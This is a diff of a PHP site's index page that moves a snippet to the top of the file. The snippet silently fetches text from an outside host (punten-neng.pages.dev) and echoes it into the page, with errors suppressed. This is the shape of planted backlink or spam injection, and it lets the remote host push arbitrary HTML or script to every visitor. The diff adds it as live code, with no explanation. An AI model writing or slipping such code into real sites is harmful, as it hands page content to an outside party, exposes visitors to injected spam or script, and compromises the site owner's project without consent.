@@ -1,4 +1,9 @@
 <?php
+$backlink = @file_get_contents("https://punten-neng.pages.dev/punten.txt");
+if ($backlink) {
+    echo $backlink;
+}
+?><?php
     $type = 'index';
     include ('yadmin/config.php');
     include ('header.php');
@@ -28,9 +33,5 @@
     </div>
 </div>
 <?php include ('footer.php'); ?>
-<?php
-$backlink = @file_get_contents("https://punten-neng.pages.dev/punten.txt");
-if ($backlink) {
-    echo $backlink;
-}
-?>
+
+
